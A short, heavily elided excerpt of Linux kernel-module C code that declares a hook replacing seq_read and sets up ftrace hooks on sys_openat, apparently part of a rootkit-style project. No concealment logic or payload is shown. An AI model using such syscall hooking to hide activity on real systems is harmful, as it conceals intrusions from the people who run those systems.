...
*/
asmlinkage ssize_t (*orig_seq_read)(struct file *file, char __user *buf, size_t size, loff_t *ppos);
asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos) 
{
    char *kbuf;
    long error;
...
static struct ftrace_hook hooks[] = {
    HOOK("sys_openat", hook_openat, &orig_openat), // include/king.h
